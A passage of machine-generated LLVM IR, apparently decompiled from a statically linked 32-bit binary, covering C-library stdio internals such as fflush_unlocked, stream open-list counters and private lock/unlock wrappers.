  %v3_8065024 = inttoptr i32 %v2_8065024 to i32*
  store i32 %v0_8065024, i32* %v3_8065024, align 4
  %v0_8065027 = load i32, i32* @ebx, align 4
  %v1_8065027 = add i32 %v0_8065027, 60
  %v2_8065027 = inttoptr i32 %v1_8065027 to i32*
  %v3_8065027 = load i32, i32* %v2_8065027, align 4
  %v4_8065027 = add i32 %v3_8065027, 1
  store i32 %v4_8065027, i32* %v2_8065027, align 4
  %v0_806502a = load i32, i32* @ecx, align 4
  %v0_806502b = load i32, i32* @ebx, align 4
  %v4_8065034 = inttoptr i32 %tmp to i8*
  %v5_8065034 = call i32 @__GI_fgets_unlocked(i8* %v4_8065034, i32 %tmp1, i32 %v0_806502b, i32 %v0_806502a)
  %v0_806503c = load i32, i32* @esi, align 4
  %v1_806503c = icmp eq i32 %v0_806503c, 0
  %v1_8065040 = icmp eq i1 %v1_806503c, false
  call void @__pseudo_cond_branch(i1 %v1_8065040, i32 134631525)
  %v0_8065042 = load i32, i32* @ebx, align 4
  %v1_8065042 = add i32 %v0_8065042, 60
  %v2_8065042 = inttoptr i32 %v1_8065042 to i32*
  %v3_8065042 = load i32, i32* %v2_8065042, align 4
  %v1_8065045 = add i32 %v3_8065042, -1
  %v8_8065045 = icmp eq i32 %v1_8065045, 0
  store i32 %v1_8065045, i32* %v2_8065042, align 4
  %v1_806504b = icmp eq i1 %v8_8065045, false
  call void @__pseudo_cond_branch(i1 %v1_806504b, i32 134631525)
  %v0_806504d = load i32, i32* @ebx, align 4
  %v1_806504d = add i32 %v0_806504d, 64
  %v2_806504d = inttoptr i32 %v1_806504d to i32*
  store i32 0, i32* %v2_806504d, align 4
  %v0_8065054 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8065054 = icmp eq i32 %v0_8065054, 0
  call void @__pseudo_cond_branch(i1 %v1_8065054, i32 134631519)
  %v0_806505e = load i32, i32* @ebx, align 4
  %v1_806505e = add i32 %v0_806505e, 56
  %v2_806505e = inttoptr i32 %v1_806505e to i32*
  %v3_806505e = load i32, i32* %v2_806505e, align 4
  %v4_806505e = add i32 %v3_806505e, -1
  %v12_806505e = icmp eq i32 %v4_806505e, 0
  store i32 %v4_806505e, i32* %v2_806505e, align 4
  %v1_8065063 = icmp eq i1 %v12_806505e, false
  call void @__pseudo_cond_branch(i1 %v1_8065063, i32 134631541)
  ret i32 %v1_8065045

; uselistorder directives
  uselistorder i32 %v4_806505e, { 1, 0 }
}

define i32 @function_8065065() local_unnamed_addr {
dec_label_pc_8065065:
  %v0_8065065 = load i32, i32* @edx, align 4
  ret i32 %v0_8065065
}

define i32 @_L_lock_18.4() local_unnamed_addr {
entry:
  %v0_806506b = load i32, i32* @ebx, align 4
  %v1_806506b = add i32 %v0_806506b, 56
  store i32 %v1_806506b, i32* @ecx, align 4
  %v0_806506e = call i32 @__lll_lock_wait_private()
  %v0_8065073 = call i32 @function_8065024()
  ret i32 %v0_8065073
}

define i32 @_L_unlock_43() local_unnamed_addr {
entry:
  %v0_8065075 = load i32, i32* @ebx, align 4
  %v1_8065075 = add i32 %v0_8065075, 56
  store i32 %v1_8065075, i32* @eax, align 4
  %v0_8065078 = call i32 @__lll_unlock_wake_private()
  %v0_806507d = call i32 @function_8065065()
  ret i32 %v0_806507d
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %v0_8065085 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_806508c = load i32, i32* @global_var_8075b78.1567, align 8
  %v12_806508c = icmp eq i32 %v0_806508c, %v0_8065085
  call void @__pseudo_cond_branch(i1 %v12_806508c, i32 ptrtoint (i32* @global_var_80650b9.1687 to i32))
  %v0_806509b = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_806509b = icmp eq i32 %v0_806509b, 0
  call void @__pseudo_cond_branch(i1 %v1_806509b, i32 134631590)
  %v0_80650a5 = load i32, i32* @global_var_8075b70.1569, align 16
  %v13_80650a5 = icmp eq i32 %v0_80650a5, 0
  %v20_80650a5 = select i1 %v13_80650a5, i32 1, i32 %v0_80650a5
  store i32 %v20_80650a5, i32* @global_var_8075b70.1569, align 16
  %v1_80650ad = icmp eq i1 %v13_80650a5, false
  call void @__pseudo_cond_branch(i1 %v1_80650ad, i32 134632353)
  ret i32 %v0_80650a5

; uselistorder directives
  uselistorder i32 %v0_80650a5, { 0, 2, 1 }
}

define i32 @function_80650b3() local_unnamed_addr {
dec_label_pc_80650b3:
  %ecx.global-to-local = alloca i32, align 4
  %v0_80650b3 = load i32, i32* @edx, align 4
  store i32 %v0_80650b3, i32* @global_var_8075b78.1567, align 8
  %v0_80650b9 = load i32, i32* @global_var_8075b7c.1673, align 4
  store i32 %v0_80650b9, i32* %ecx.global-to-local, align 4
  %v0_80650bf = load i32, i32* @global_var_8075b74.1568, align 4
  %v1_80650bf = add i32 %v0_80650bf, 1
  store i32 %v1_80650bf, i32* @global_var_8075b74.1568, align 4
  %v9_80650c5 = icmp eq i32 %v0_80650b9, 1
  %v1_80650c8 = icmp eq i1 %v9_80650c5, false
  call void @__pseudo_cond_branch(i1 %v1_80650c8, i32 134631817)
  %v0_80650ce = load i32, i32* @global_var_8075b80.1675, align 128
  %tmp = icmp slt i32 %v0_80650ce, 1
  call void @__pseudo_cond_branch(i1 %tmp, i32 134631817)
  %v0_80650db = load i32, i32* @global_var_8075b6c.1564, align 4
  %v1_80650db = load i32, i32* @edx, align 4
  %v12_80650db = icmp eq i32 %v0_80650db, %v1_80650db
  call void @__pseudo_cond_branch(i1 %v12_80650db, i32 ptrtoint (i32* @global_var_8065103.1688 to i32))
  %v0_80650e5 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80650e5 = icmp eq i32 %v0_80650e5, 0
  call void @__pseudo_cond_branch(i1 %v1_80650e5, i32 134631664)
  %v0_80650ef = load i32, i32* @global_var_8075b64.1566, align 4
  %v1_80650ef = load i32, i32* %ecx.global-to-local, align 4
  %v13_80650ef = icmp eq i32 %v0_80650ef, 0
  %v20_80650ef = select i1 %v13_80650ef, i32 %v1_80650ef, i32 %v0_80650ef
  store i32 %v20_80650ef, i32* @global_var_8075b64.1566, align 4
  %v1_80650f7 = icmp eq i1 %v13_80650ef, false
  call void @__pseudo_cond_branch(i1 %v1_80650f7, i32 134632369)
  ret i32 %v0_80650ef

; uselistorder directives
  uselistorder i32 %v0_80650ef, { 0, 2, 1 }
}

define i32 @function_80650fd() local_unnamed_addr {
dec_label_pc_80650fd:
  %edx.global-to-local = alloca i32, align 4
  %v0_80650fd = load i32, i32* @edx, align 4
  store i32 %v0_80650fd, i32* @global_var_8075b6c.1564, align 4
  %v0_8065103 = load i32, i32* @global_var_8075b68.1565, align 8
  %v1_8065103 = add i32 %v0_8065103, 1
  store i32 %v1_8065103, i32* @global_var_8075b68.1565, align 8
  store i32 0, i32* @esi, align 4
  %storemerge1 = load i32, i32* bitcast (i32** @global_var_8071920.1563 to i32*), align 4
  store i32 %storemerge1, i32* %edx.global-to-local, align 4
  %v1_806514a2 = icmp eq i32 %storemerge1, 0
  %v1_806514c9 = icmp eq i1 %v1_806514a2, false
  br i1 %v1_806514c9, label %dec_label_pc_8065113, label %dec_label_pc_806514e

dec_label_pc_8065113:                             ; preds = %dec_label_pc_80650fd, %dec_label_pc_806514a.backedge
  %v0_8065123 = phi i32 [ %storemerge, %dec_label_pc_806514a.backedge ], [ %storemerge1, %dec_label_pc_80650fd ]
  %v1_8065113 = inttoptr i32 %v0_8065123 to i16*
  %v2_8065113 = load i16, i16* %v1_8065113, align 2
  %v1_8065116 = add i32 %v0_8065123, 32
  %v2_8065116 = inttoptr i32 %v1_8065116 to i32*
  %v3_8065116 = load i32, i32* %v2_8065116, align 4
  store i32 %v3_8065116, i32* @ebx, align 4
  %v1_8065119 = and i16 %v2_8065113, -32720
  %v6_806511e = icmp eq i16 %v1_8065119, 48
  br i1 %v6_806511e, label %dec_label_pc_8065127, label %dec_label_pc_8065123

dec_label_pc_8065123:                             ; preds = %dec_label_pc_8065113
  store i32 %v0_8065123, i32* @esi, align 4
  br label %dec_label_pc_806514a.backedge

dec_label_pc_8065127:                             ; preds = %dec_label_pc_8065113
  %v0_8065127 = load i32, i32* @esi, align 4
  %v1_8065127 = icmp eq i32 %v0_8065127, 0
  %v1_8065129 = icmp eq i1 %v1_8065127, false
  br i1 %v1_8065129, label %dec_label_pc_8065133, label %dec_label_pc_806512b

dec_label_pc_806512b:                             ; preds = %dec_label_pc_8065127
  store i32 %v3_8065116, i32* bitcast (i32** @global_var_8071920.1563 to i32*), align 32
  br label %dec_label_pc_8065136

dec_label_pc_8065133:                             ; preds = %dec_label_pc_8065127
  %v2_8065133 = add i32 %v0_8065127, 32
  %v3_8065133 = inttoptr i32 %v2_8065133 to i32*
  store i32 %v3_8065116, i32* %v3_8065133, align 4
  %v0_8065136.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8065136

dec_label_pc_8065136:                             ; preds = %dec_label_pc_806512b, %dec_label_pc_8065133
  %v0_806513f = phi i32 [ %v0_8065123, %dec_label_pc_806512b ], [ %v0_8065136.pre, %dec_label_pc_8065133 ]
  %v1_8065136 = add i32 %v0_806513f, 1
  %v2_8065136 = inttoptr i32 %v1_8065136 to i8*
  %v3_8065136 = load i8, i8* %v2_8065136, align 1
  %v4_8065136 = and i8 %v3_8065136, 32
  %v5_8065136 = icmp eq i8 %v4_8065136, 0
  br i1 %v5_8065136, label %dec_label_pc_806514a.backedge, label %dec_label_pc_806513c

dec_label_pc_806514a.backedge:                    ; preds = %dec_label_pc_8065136, %dec_label_pc_8065123, %dec_label_pc_806513c
  %storemerge = load i32, i32* @ebx, align 4
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v1_806514a = icmp eq i32 %storemerge, 0
  %v1_806514c = icmp eq i1 %v1_806514a, false
  br i1 %v1_806514c, label %dec_label_pc_8065113, label %dec_label_pc_806514a.dec_label_pc_806514e_crit_edge

dec_label_pc_806513c:                             ; preds = %dec_label_pc_8065136
  %v0_806513c = load i32, i32* @esp, align 4
  %v2_806513f = add i32 %v0_806513c, -16
  %v3_806513f = inttoptr i32 %v2_806513f to i32*
  store i32 %v0_806513f, i32* %v3_806513f, align 4
  %v1_8065140 = call i32 @free(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_806514a.backedge

dec_label_pc_806514a.dec_label_pc_806514e_crit_edge: ; preds = %dec_label_pc_806514a.backedge
  %v0_806514e.pre = load i32, i32* @global_var_8075b68.1565, align 8
  br label %dec_label_pc_806514e

dec_label_pc_806514e:                             ; preds = %dec_label_pc_806514a.dec_label_pc_806514e_crit_edge, %dec_label_pc_80650fd
  %v0_806514e = phi i32 [ %v0_806514e.pre, %dec_label_pc_806514a.dec_label_pc_806514e_crit_edge ], [ %v1_8065103, %dec_label_pc_80650fd ]
  %v1_8065153 = add i32 %v0_806514e, -1
  %v8_8065153 = icmp eq i32 %v1_8065153, 0
  store i32 %v1_8065153, i32* @global_var_8075b68.1565, align 8
  %v1_806515b = icmp eq i1 %v8_8065153, false
  call void @__pseudo_cond_branch(i1 %v1_806515b, i32 134631807)
  store i32 0, i32* @global_var_8075b6c.1564, align 4
  %v0_8065167 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8065167 = icmp eq i32 %v0_8065167, 0
  call void @__pseudo_cond_branch(i1 %v1_8065167, i32 134631794)
  %v0_8065171 = load i32, i32* @global_var_8075b64.1566, align 4
  %v1_8065171 = add i32 %v0_8065171, -1
  %v9_8065171 = icmp eq i32 %v1_8065171, 0
  store i32 %v1_8065171, i32* @global_var_8075b64.1566, align 4
  %v1_8065179 = icmp eq i1 %v9_8065171, false
  call void @__pseudo_cond_branch(i1 %v1_8065179, i32 134632385)
  ret i32 %v1_8065153

; uselistorder directives
  uselistorder i32 %v1_8065171, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_8065123, { 0, 1, 3, 2 }
  uselistorder i32* %edx.global-to-local, { 2, 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8071920.1563 to i32*), { 3, 1, 4, 5, 2, 0, 6 }
  uselistorder label %dec_label_pc_806514a.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065136, { 1, 0 }
  uselistorder label %dec_label_pc_8065113, { 1, 0 }
}

define i32 @function_806517f() local_unnamed_addr {
dec_label_pc_806517f:
  store i32 0, i32* @global_var_8075b80.1675, align 128
  %v0_8065189 = load i32, i32* @global_var_8075b7c.1673, align 4
  %v1_806518e = add i32 %v0_8065189, -1
  store i32 %v1_806518e, i32* @global_var_8075b7c.1673, align 4
  %v0_8065194 = load i32, i32* @global_var_8075b74.1568, align 4
  %v1_8065199 = add i32 %v0_8065194, -1
  %v8_8065199 = icmp eq i32 %v1_8065199, 0
  store i32 %v1_8065199, i32* @global_var_8075b74.1568, align 4
  %v1_80651a1 = icmp eq i1 %v8_8065199, false
  call void @__pseudo_cond_branch(i1 %v1_80651a1, i32 134631877)
  store i32 0, i32* @global_var_8075b78.1567, align 8
  %v0_80651ad = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80651ad = icmp eq i32 %v0_80651ad, 0
  call void @__pseudo_cond_branch(i1 %v1_80651ad, i32 134631864)
  %v0_80651b7 = load i32, i32* @global_var_8075b70.1569, align 16
  %v1_80651b7 = add i32 %v0_80651b7, -1
  %v9_80651b7 = icmp eq i32 %v1_80651b7, 0
  store i32 %v1_80651b7, i32* @global_var_8075b70.1569, align 16
  %v1_80651bf = icmp eq i1 %v9_80651b7, false
  call void @__pseudo_cond_branch(i1 %v1_80651bf, i32 134632401)
  ret i32 %v1_8065199

; uselistorder directives
  uselistorder i32 %v1_80651b7, { 1, 0 }
}

define i32 @function_80651c5() local_unnamed_addr {
dec_label_pc_80651c5:
  %tmp = call i32 @__decompiler_undefined_function_0()
  ret i32 %tmp
}

define i32 @fflush_unlocked(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v6_80651d4 = icmp eq i32 %arg1, 134682912
  %v1_80651da = icmp eq i1 %v6_80651d4, false
  br i1 %v1_80651da, label %dec_label_pc_80651e2, label %dec_label_pc_80651dc

dec_label_pc_80651dc:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80651ef

dec_label_pc_80651e2:                             ; preds = %entry
  %v1_80651e2 = icmp eq i32 %arg1, 0
  store i32 256, i32* @ebp, align 4
  %v1_80651e9 = icmp eq i1 %v1_80651e2, false
  call void @__pseudo_cond_branch(i1 %v1_80651e9, i32 134632301)
  br label %dec_label_pc_80651ef

dec_label_pc_80651ef:                             ; preds = %dec_label_pc_80651dc, %dec_label_pc_80651e2
  %v0_80651ef = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_80651ef, i32* @esi, align 4
  %v0_80651f6 = load i32, i32* @global_var_8075b78.1567, align 8
  %v12_80651f6 = icmp eq i32 %v0_80651f6, %v0_80651ef
  call void @__pseudo_cond_branch(i1 %v12_80651f6, i32 ptrtoint (i32* @global_var_8065223.1689 to i32))
  %v0_8065203 = load i32, i32* @ebx, align 4
  %v0_8065205 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8065205 = icmp eq i32 %v0_8065205, 0
  call void @__pseudo_cond_branch(i1 %v1_8065205, i32 134631952)
  %v0_806520f = load i32, i32* @global_var_8075b70.1569, align 16
  %v13_806520f = icmp eq i32 %v0_8065203, %v0_806520f
  %v20_806520f = select i1 %v13_806520f, i32 1, i32 %v0_806520f
  store i32 %v20_806520f, i32* @global_var_8075b70.1569, align 16
  %v1_8065217 = icmp eq i1 %v13_806520f, false
  call void @__pseudo_cond_branch(i1 %v1_8065217, i32 134632417)
  ret i32 %v0_806520f

; uselistorder directives
  uselistorder i32 %v0_806520f, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80651ef, { 1, 0 }
}

define i32 @function_806521d() local_unnamed_addr {
dec_label_pc_806521d:
  %v0_806521d = load i32, i32* @esi, align 4
  store i32 %v0_806521d, i32* @global_var_8075b78.1567, align 8
  %v0_8065223 = load i32, i32* @global_var_8075b7c.1673, align 4
  %v0_8065228 = load i32, i32* @global_var_8075b74.1568, align 4
  %v1_806522e = add i32 %v0_8065223, 1
  %v1_806522f = icmp eq i32 %v0_8065228, 0
  store i32 %v1_806522e, i32* @global_var_8075b7c.1673, align 4
  %v1_8065236 = icmp eq i1 %v1_806522f, false
  call void @__pseudo_cond_branch(i1 %v1_8065236, i32 134632026)
  store i32 0, i32* @global_var_8075b78.1567, align 8
  %v0_8065242 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8065242 = icmp eq i32 %v0_8065242, 0
  call void @__pseudo_cond_branch(i1 %v1_8065242, i32 134632013)
  %v0_806524c = load i32, i32* @global_var_8075b70.1569, align 16
  %v1_806524c = add i32 %v0_806524c, -1
  %v9_806524c = icmp eq i32 %v1_806524c, 0
  store i32 %v1_806524c, i32* @global_var_8075b70.1569, align 16
  %v1_8065254 = icmp eq i1 %v9_806524c, false
  call void @__pseudo_cond_branch(i1 %v1_8065254, i32 134632433)
  ret i32 %v1_806522e

; uselistorder directives
  uselistorder i32 %v1_806524c, { 1, 0 }
}

define i32 @function_806525a() local_unnamed_addr {
dec_label_pc_806525a:
  %v0_806525a = load i32, i32* @global_var_8075b6c.1564, align 4
  %v1_806525a = load i32, i32* @esi, align 4
  %v12_806525a = icmp eq i32 %v0_806525a, %v1_806525a
  call void @__pseudo_cond_branch(i1 %v12_806525a, i32 ptrtoint (i32* @global_var_8065287.1690 to i32))
  %v0_8065267 = load i32, i32* @ebx, align 4
  %v0_8065269 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8065269 = icmp eq i32 %v0_8065269, 0
  call void @__pseudo_cond_branch(i1 %v1_8065269, i32 134632052)
  %v0_8065273 = load i32, i32* @global_var_8075b64.1566, align 4
  %v13_8065273 = icmp eq i32 %v0_8065267, %v0_8065273
  %v20_8065273 = select i1 %v13_8065273, i32 1, i32 %v0_8065273
  store i32 %v20_8065273, i32* @global_var_8075b64.1566, align 4
  %v1_806527b = icmp eq i1 %v13_8065273, false
  call void @__pseudo_cond_branch(i1 %v1_806527b, i32 134632449)
  ret i32 %v0_8065273

; uselistorder directives
  uselistorder i32 %v0_8065273, { 0, 2, 1 }
}

define i32 @function_8065281() local_unnamed_addr {
dec_label_pc_8065281:
  %v0_8065281 = load i32, i32* @esi, align 4
  store i32 %v0_8065281, i32* @global_var_8075b6c.1564, align 4
  %v0_8065287 = load i32, i32* @global_var_8075b68.1565, align 8
  %v1_8065292 = icmp eq i32 %v0_8065287, 0
  %v1_8065294 = icmp eq i1 %v1_8065292, false
  call void @__pseudo_cond_branch(i1 %v1_8065294, i32 134632120)
  store i32 0, i32* @global_var_8075b6c.1564, align 4
  %v0_80652a0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80652a0 = icmp eq i32 %v0_80652a0, 0
  call void @__pseudo_cond_branch(i1 %v1_80652a0, i32 134632107)
  %v0_80652aa = load i32, i32* @global_var_8075b64.1566, align 4
  %v1_80652aa = add i32 %v0_80652aa, -1
  %v9_80652aa = icmp eq i32 %v1_80652aa, 0
  store i32 %v1_80652aa, i32* @global_var_8075b64.1566, align 4
  %v1_80652b2 = icmp eq i1 %v9_80652aa, false
  call void @__pseudo_cond_branch(i1 %v1_80652b2, i32 134632465)
  ret i32 %v0_8065287

; uselistorder directives
  uselistorder i32 %v1_80652aa, { 1, 0 }
  uselistorder i32* @global_var_8075b68.1565, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
}

define i32 @function_80652b8() local_unnamed_addr {
dec_label_pc_80652b8:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 0, i32* @edi, align 4
  %v0_80652ba = call i32 @function_806535e()
  store i32 %v0_80652ba, i32* %eax.global-to-local, align 4
  %v0_80652bf = load i32, i32* @ebx, align 4
  %v1_80652bf = inttoptr i32 %v0_80652bf to i8*
  %v2_80652bf = load i8, i8* %v1_80652bf, align 1
  %v3_80652bf = and i8 %v2_80652bf, 64
  %v4_80652bf = icmp eq i8 %v3_80652bf, 0
  call void @__pseudo_cond_branch(i1 %v4_80652bf, i32 134632283)
  %v0_80652c8 = load i32, i32* @global_var_8071924.1676, align 4
  %v9_80652c8 = icmp eq i32 %v0_80652c8, 2
  call void @__pseudo_cond_branch(i1 %v9_80652c8, i32 134632184)
  %v0_80652d1 = load i32, i32* @ebx, align 4
  %v1_80652d1 = add i32 %v0_80652d1, 64
  %v2_80652d1 = inttoptr i32 %v1_80652d1 to i32*
  %v3_80652d1 = load i32, i32* %v2_80652d1, align 4
  %v4_80652d1 = load i32, i32* @esi, align 4
  %v15_80652d1 = icmp eq i32 %v3_80652d1, %v4_80652d1
  call void @__pseudo_cond_branch(i1 %v15_80652d1, i32 134632181)
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v0_80652dd = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80652dd = icmp eq i32 %v0_80652dd, 0
  call void @__pseudo_cond_branch(i1 %v1_80652dd, i32 134632168)
  %v0_80652e7 = load i32, i32* @ebx, align 4
  %v1_80652e7 = add i32 %v0_80652e7, 56
  %v2_80652e7 = inttoptr i32 %v1_80652e7 to i32*
  %v3_80652e7 = load i32, i32* %v2_80652e7, align 4
  %v4_80652e7 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80652e7 = load i32, i32* %eax.global-to-local, align 4
  %v16_80652e7 = icmp eq i32 %v5_80652e7, %v3_80652e7
  %v23_80652e7 = select i1 %v16_80652e7, i32 %v4_80652e7, i32 %v3_80652e7
  store i32 %v23_80652e7, i32* %v2_80652e7, align 4
  store i32 %v3_80652e7, i32* %eax.global-to-local, align 4
  %v1_80652ec = icmp eq i1 %v16_80652e7, false
  call void @__pseudo_cond_branch(i1 %v1_80652ec, i32 134632481)
  ret i32 %v3_80652e7

; uselistorder directives
  uselistorder i1 %v16_80652e7, { 1, 0 }
  uselistorder i32 %v3_80652e7, { 1, 0, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 0 }
}

define i32 @function_80652f2() local_unnamed_addr {
dec_label_pc_80652f2:
  %v0_80652f2 = load i32, i32* @esi, align 4
  %v1_80652f2 = load i32, i32* @ebx, align 4
  %v2_80652f2 = add i32 %v1_80652f2, 64
  %v3_80652f2 = inttoptr i32 %v2_80652f2 to i32*
  store i32 %v0_80652f2, i32* %v3_80652f2, align 4
  %v0_80652f5 = load i32, i32* @ebx, align 4
  %v1_80652f5 = add i32 %v0_80652f5, 60
  %v2_80652f5 = inttoptr i32 %v1_80652f5 to i32*
  %v3_80652f5 = load i32, i32* %v2_80652f5, align 4
  %v4_80652f5 = add i32 %v3_80652f5, 1
  store i32 %v4_80652f5, i32* %v2_80652f5, align 4
  %v0_80652f8 = load i32, i32* @ebx, align 4
  %v1_80652f8 = inttoptr i32 %v0_80652f8 to i32*
  %v2_80652f8 = load i32, i32* %v1_80652f8, align 4
  %v1_80652fa = load i32, i32* @ebp, align 4
  %v2_80652fa = or i32 %v1_80652fa, %v2_80652f8
  %v1_80652fc = and i32 %v2_80652fa, 832
  %v2_8065301 = icmp eq i32 %v1_80652fc, 320
  %v1_8065306 = icmp eq i1 %v2_8065301, false
  br i1 %v1_8065306, label %dec_label_pc_806532b, label %dec_label_pc_8065308

dec_label_pc_8065308:                             ; preds = %dec_label_pc_80652f2
  %v1_806530c = call i32 @__stdio_wcommit(i32 %v0_80652f8)
  %v1_8065314 = icmp eq i32 %v1_806530c, 0
  br i1 %v1_8065314, label %dec_label_pc_806531d, label %dec_label_pc_8065318

dec_label_pc_8065318:                             ; preds = %dec_label_pc_8065308
  br label %dec_label_pc_806532b

dec_label_pc_806531d:                             ; preds = %dec_label_pc_8065308
  %v0_806531d = load i32, i32* @ebx, align 4
  %v1_806531d = add i32 %v0_806531d, 8
  %v2_806531d = inttoptr i32 %v1_806531d to i32*
  %v3_806531d = load i32, i32* %v2_806531d, align 4
  %v2_8065320 = add i32 %v0_806531d, 28
  %v3_8065320 = inttoptr i32 %v2_8065320 to i32*
  store i32 %v3_806531d, i32* %v3_8065320, align 4
  %v0_8065323 = load i32, i32* @ebx, align 4
  %v1_8065323 = inttoptr i32 %v0_8065323 to i32*
  %v2_8065323 = load i32, i32* %v1_8065323, align 4
  %v2_8065323.tr = trunc i32 %v2_8065323 to i16
  %v1_8065328 = and i16 %v2_8065323.tr, -65
  %v3_8065328 = inttoptr i32 %v0_8065323 to i16*
  store i16 %v1_8065328, i16* %v3_8065328, align 2
  br label %dec_label_pc_806532b

dec_label_pc_806532b:                             ; preds = %dec_label_pc_80652f2, %dec_label_pc_8065318, %dec_label_pc_806531d
  %v0_806532b = load i32, i32* @global_var_8071924.1676, align 4
  %v9_806532b = icmp eq i32 %v0_806532b, 2
  call void @__pseudo_cond_branch(i1 %v9_806532b, i32 134632283)
  %v0_8065334 = load i32, i32* @ebx, align 4
  %v1_8065334 = add i32 %v0_8065334, 60
  %v2_8065334 = inttoptr i32 %v1_8065334 to i32*
  %v3_8065334 = load i32, i32* %v2_8065334, align 4
  %v1_8065337 = add i32 %v3_8065334, -1
  %v8_8065337 = icmp eq i32 %v1_8065337, 0
  store i32 %v1_8065337, i32* %v2_8065334, align 4
  %v1_806533d = icmp eq i1 %v8_8065337, false
  call void @__pseudo_cond_branch(i1 %v1_806533d, i32 134632283)
  %v0_806533f = load i32, i32* @ebx, align 4
  %v1_806533f = add i32 %v0_806533f, 64
  %v2_806533f = inttoptr i32 %v1_806533f to i32*
  store i32 0, i32* %v2_806533f, align 4
  %v0_8065346 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8065346 = icmp eq i32 %v0_8065346, 0
  call void @__pseudo_cond_branch(i1 %v1_8065346, i32 134632273)
  %v0_8065350 = load i32, i32* @ebx, align 4
  %v1_8065350 = add i32 %v0_8065350, 56
  %v2_8065350 = inttoptr i32 %v1_8065350 to i32*
  %v3_8065350 = load i32, i32* %v2_8065350, align 4
  %v4_8065350 = add i32 %v3_8065350, -1
  %v12_8065350 = icmp eq i32 %v4_8065350, 0
  store i32 %v4_8065350, i32* %v2_8065350, align 4
  %v1_8065355 = icmp eq i1 %v12_8065350, false
  call void @__pseudo_cond_branch(i1 %v1_8065355, i32 134632494)
  ret i32 %v1_8065337

; uselistorder directives
  uselistorder i32 %v4_8065350, { 1, 0 }
  uselistorder label %dec_label_pc_806532b, { 2, 1, 0 }
}

define i32 @function_806535b() local_unnamed_addr {
dec_label_pc_806535b:
  %v4_806535b = load i32, i32* @eax, align 4
  ret i32 %v4_806535b
}

define i32 @function_806535e() local_unnamed_addr {
dec_label_pc_806535e:
  %v0_806535e = load i32, i32* @ebx, align 4
  %v1_806535e = icmp eq i32 %v0_806535e, 0
  %v1_8065360 = icmp eq i1 %v1_806535e, false
  call void @__pseudo_cond_branch(i1 %v1_8065360, i32 134632127)
  %v0_8065366 = call i32 @_stdio_openlist_dec_use()
  %v0_806539a = load i32, i32* @edi, align 4
  ret i32 %v0_806539a
}

define i32 @_L_lock_13() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @ecx, align 4
  %v0_80653a7 = call i32 @__lll_lock_wait_private()
  %v0_80653ac = call i32 @function_80650b3()
  ret i32 %v0_80653ac
}

define i32 @_L_lock_30.5() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @ecx, align 4
  %v0_80653b7 = call i32 @__lll_lock_wait_private()
  %v0_80653bc = call i32 @function_80650fd()
  ret i32 %v0_80653bc
}

define i32 @_L_unlock_88() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @eax, align 4
  %v0_80653c7 = call i32 @__lll_unlock_wake_private()
  %v0_80653cc = call i32 @function_806517f()
  ret i32 %v0_80653cc
}

define i32 @_L_unlock_104() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @eax, align 4
  %v0_80653d7 = call i32 @__lll_unlock_wake_private()
  %v0_80653dc = call i32 @function_80651c5()
  ret i32 %v0_80653dc
}

define i32 @_L_lock_144() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @ecx, align 4
  %v0_80653e7 = call i32 @__lll_lock_wait_private()
  %v0_80653ec = call i32 @function_806521d()
  ret i32 %v0_80653ec
}

define i32 @_L_unlock_156() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @eax, align 4
  %v0_80653f7 = call i32 @__lll_unlock_wake_private()
  %v0_80653fc = call i32 @function_806525a()
  ret i32 %v0_80653fc
}

define i32 @_L_lock_164() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @ecx, align 4
  %v0_8065407 = call i32 @__lll_lock_wait_private()
  %v0_806540c = call i32 @function_8065281()
  ret i32 %v0_806540c
}

define i32 @_L_unlock_174() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @eax, align 4
  %v0_8065417 = call i32 @__lll_unlock_wake_private()
  %v0_806541c = call i32 @function_80652b8()
  ret i32 %v0_806541c
}

define i32 @_L_lock_195() local_unnamed_addr {
entry:
  %v0_8065421 = load i32, i32* @ebx, align 4
